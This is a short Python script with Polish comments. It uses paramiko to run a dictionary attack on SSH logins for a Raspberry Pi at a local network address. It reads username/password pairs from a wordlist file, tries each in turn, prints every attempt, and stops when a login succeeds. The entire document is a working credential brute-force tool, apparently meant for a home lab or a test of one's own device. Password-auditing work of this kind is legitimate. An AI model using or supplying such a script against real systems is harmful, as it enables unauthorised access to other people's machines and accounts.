import paramiko
import time

# Adres Raspberry Pi
HOST = "192.168.0.100"
PORT = 22

# Wczytaj dane z pliku
def load_credentials(filename):
    credentials = []
    with open(filename, "r") as file:
        for line in file:
            parts = line.strip().split()
            if len(parts) == 2:
                credentials.append((parts[0], parts[1]))
    return credentials

# Próba logowania przez SSH
def try_ssh_login(username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(HOST, port=PORT, username=username, password=password, timeout=5)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"Błąd połączenia: {e}")
        return False

def main():
    credentials = load_credentials("slownik.txt")
    print("Rozpoczynam testowanie danych logowania...\n")

    for username, password in credentials:
        print(f"Próba logowania: login = {username}, hasło = {password}")
        success = try_ssh_login(username, password)
        if success:
            print(f"\n✅ Uzyskano dostęp po SSH.\nPoprawne dane logowania - login: {username}, hasło: {password}")
            break
        else:
            print("❌ Logowanie nieudane.\n")
        time.sleep(1)  # opcjonalne opóźnienie

if __name__ == "__main__":
    main()
